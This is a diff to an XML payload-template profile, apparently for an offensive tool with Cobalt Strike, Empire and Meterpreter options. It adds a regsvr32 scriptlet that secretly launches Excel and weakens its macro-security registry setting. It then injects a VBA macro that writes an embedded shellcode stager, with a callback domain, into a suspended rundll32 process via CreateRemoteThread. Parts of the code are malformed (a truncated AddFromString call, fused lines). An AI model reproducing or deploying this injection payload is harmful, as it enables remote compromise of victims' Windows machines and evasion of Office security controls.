@@ -2,61 +2,171 @@
 	<var>
 		<name>Shellcode</name>
 			<val>Cobalt Strike</val>
-			<opt>Cobalt Strike</opt>
-			<opt>Empire</opt>
-			<opt>Meterpreter</opt>
+			<opt>Cobalt Strike</opt>	<alias>CS_shellcode_goes_here</alias>
+			<opt>Empire</opt>		<alias>Empire_Shellcode_goes_here</alias>
+			<opt>Meterpreter</opt>		<alias>123456789</alias>
 	</var>
 	
 	<var>
-		<name>Staging Method</name>
+		<name>Staging_Method</name>
 			<val>regsvr32.exe</val>
-			<opt>regsvr32.exe</opt>
-			<opt>VBscript GetObject()</opt>
-			<opt>VBA Macro</opt>
+			<opt>regsvr32.exe</opt>		<alias>regsvr32.exe</alias>
+			<opt>VBscript GetObject()</opt> <alias>getObject()</alias>
+			<opt>VBA Macro</opt>		<alias>VBA Macro</alias>
 	</var>
 
 	<var>
-		<name>IP</name>
-			<val>127.0.0.1</val>
-			<opt>*</opt>
+		<name>Redirector</name>
+			<val>127.0.0.1</val> 
+			<opt>*</opt> 			<alias><_val_></alias>
 	</var>
-
+	
 	<var>
 		<name>Port</name>
 			<val>80</val>
-			<opt>*</opt>
+			<opt>*</opt> 			<alias><_val_></alias>
 	</var>
 
 	<var>
-		<name>Process</name>
+		<name>Process_x86</name>
 			<val>rundll32.exe</val>
-			<opt>*</opt>
+			<opt>*</opt> 			<alias><_val_></alias>
+	</var>
+	
+	<var>
+		<name>Process_x64</name>
+			<val>rundll32.exe</val>
+			<opt>*</opt> 			<alias><_val_></alias>
 	</var>
 
 	<var>
-		<name>Disable SSL Caching</name>
-		<val>False</val>
-		<opt>False</opt>
-		<opt>True</opt>
+		<name>Disable_SSL_Caching</name>
+			<val>False</val>
+			<opt>False</opt>		<alias>False</alias>
+			<opt>True</opt>			<alias>True</alias>
 	</var>
 	
 	<template>
+			<_Shellcode_>
+			Redirecot IP == <_Redirector_>
+			Comms Port == <_Port_>
 			<?XML version="1.0"?>
 			<scriptlet>
-				<registration progid="exampleprogid" classid="{exampleclassid}" >
+				<registration progid="41632f" classid="{26e7f0c8-9a5b-42d3-93cc-9d7320d142d0}" >
 					<script language="vbscript">
-						<![CDATA[
-						' Insert Shellcode
-						' Insert Staging Method
-						' Insert IP
-						' Insert Port
-						' Insert Process
+					<![CDATA[
+						Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
+	
+		Set objExcel = CreateObject("Excel.Application")
+		objExcel.Visible = False
+		
+		Set WshShell = CreateObject("Wscript.Shell")
+		
+		function RegExists(regKey)
+			on error resume next
+			WshShell.RegRead regKey
+			RegExists = (Err.number = 0)
+		end function
+		
+		' Get the old AccessVBOM value
+		RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & objExcel.Version & "\Excel\Security\AccessVBOM"
+		
+		if RegExists(RegPath) then
+			action = WshShell.RegRead(RegPath)
+		else
+			action = ""
+		end if
+		
+		' Weaken the target
+		WshShell.RegWrite RegPath, 1, "REG_DWORD"
+		
+		' Run the macro
+		Set objWorkbook = objExcel.Workbooks.Add()
+		Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
+		xlmodule.CodeModule.AddFromString
+		
+				Private Type PROCESS_INFORMATION    
+					hProcess As Long    
+					hThread As Long    
+					dwProcessId As Long   
+					dwThreadId As Long
+				End Type
+		
+				Private Type STARTUPINFO   
+					cb As Long    
+					lpReserved As String    
+					lpDesktop As String    
+					lpTitle As String    
+					dwX As Long    
+					dwY As Long    
+					dwXSize As Long    
+					dwYSize As Long    
+					dwXCountChars As Long    
+					dwYCountChars As Long    
+					dwFillAttribute As Long    
+					dwFlags As Long    
+					wShowWindow As Integer    
+					cbReserved2 As Integer    
+					lpReserved2 As Long    
+					hStdInput As Long    
+					hStdOutput As Long    
+					hStdError As Long
+				End Type
+	
+				#If VBA7 Then    
+					Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr    
+					Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr    
+					Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr    
+					Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#Else    
+					Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long    
+					Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long    
+					Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
+					Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#End IfSub Auto_Open()    
+					Dim myByte As Long, myArray As Variant, offset As Long    
+					Dim pInfo As PROCESS_INFORMATION    
+					Dim sInfo As STARTUPINFO    
+					Dim sNull As String    
+					Dim sProc As String
+	
+				#If VBA7 Then    
+					Dim rwxpage As LongPtr, res As LongPtr
+				#Else    
+					Dim rwxpage As Long, res As Long
+				#End If   
+			
+					Set myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84, _60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48, _80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3, _125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91, _91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _-43,-24,-128,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,54,46, _49,59,32,87,79,87,54,52,59,32,84,114,105,100,101,110,116,47,55,46,48,59,32,114,118,58,49,49,46,48,41,32, _108,105,107,101,32,71,101,99,107,111,0,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _88,88,88,88,88,0,89,49,-1,87,87,87,87,81,104,58,86,121,-89,-1,-43,-23,-109,0,0,0,91,49,-55,81,81,106, _3,81,81,104,-69,1,0,0,83,80,104,87,-119,-97,-58,-1,-43,-119,-61,-21,122,89,49,-46,82,104,0,50,-96,-124,82,82, _82,81,82,80,104,-21,85,46,59,-1,-43,-119,-58,104,-128,51,0,0,-119,-32,106,4,80,106,31,86,104,117,70,-98,-122,-1, _-43,49,-1,87,87,87,87,86,104,45,6,24,123,-1,-43,-123,-64,116,72,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59, _-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0, _0,57,-57,117,4,-119,-40,-21,-118,49,-1,-21,21,-21,73,-24,-127,-1,-1,-1,47,54,119,105,70,0,0,104,-16,-75,-94,86, _-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,83,83,-119,-25,87,104,0,32,0, _0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-51,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,29,-1,-1,-1,119,119,119, _46,98,114,111,119,115,101,45,115,101,99,117,114,101,108,121,46,99,111,109,0)    
+		
+					If Len(Environ("ProgramW6432")) > 0 Then        
+						sProc = Environ("windir") & "\\SysWOW64\\<_Process_x64_>"    
+					Else        
+						sProc = Environ("windir") & "\\System32\\<_Process_x86_>"    
+					End If    
+	
+					res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)    
+					rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)    
+	
+					For offset = LBound(myArray) To UBound(myArray)        
+						myByte = myArray(offset)        
+						res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)    
+					Next offset    
+	
+					res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
+	
+				objExcel.DisplayAlerts = False
+				on error resume next
+				objExcel.Run "Auto_Open"
+				objWorkbook.Close False
+				objExcel.Quit
+	
+				' Restore the registry to its old state
+				if action = "" then
+					WshShell.RegDelete RegPath
+				else
+					WshShell.RegWrite RegPath, action, "REG_DWORD"
+				end if
 						]]>
 					</script>
 				</registration>
-			</scriptlet>	
+			</scriptlet>			
 	</template>
-
-
-
 </profile>
